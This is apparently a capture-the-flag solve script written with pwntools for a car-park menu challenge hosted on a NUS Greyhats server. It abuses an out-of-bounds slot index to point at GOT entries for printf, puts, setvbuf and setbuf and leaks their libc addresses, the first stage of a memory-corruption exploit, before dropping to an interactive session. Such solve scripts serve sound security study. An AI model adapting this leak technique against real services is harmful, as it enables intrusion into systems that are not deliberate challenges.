from pwn import *

e = ELF('./chall')
# p = e.process()
p = remote('ico.nusgreyhats.org', 80)

def menu(choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice).encode())

def change_carpark1(slot, val):
    menu(1)
    p.recvuntil(b'> ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'New value > ')
    p.sendline(str(val).encode())

def change_carpark2(slot, val):
    menu(3)
    p.recvuntil(b'> ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'New value > ')
    p.sendline(str(val).encode())

def view_carpark2(idx):
    menu(4)
    p.sendlineafter(b'> ', str(idx).encode())
    p.recvuntil(f'car {idx} is '.encode())
    return int(p.recvline().strip())

puts_addr= 0x404068
printf_addr = 0x404020
set_vbuf = 0x404018
set_buf = 0x404060


change_carpark1(10, printf_addr)  
leaked_printf = view_carpark2(0)
print(f"Leaked printf@libc: {hex(leaked_printf)}")

change_carpark1(10, puts_addr)
leaked_puts = view_carpark2(0)
print(f"Leaked puts@libc: {hex(leaked_puts)}")

change_carpark1(10, set_vbuf)
leaked_set_vbuf = view_carpark2(0)
print(f"Leaked set_vbuf@libc: {hex(leaked_set_vbuf)}")


change_carpark1(10, set_buf)
leaked_setbuf = view_carpark2(0)
print(f"Leaked setbuf@libc: {hex(leaked_setbuf)}")

p.interactive()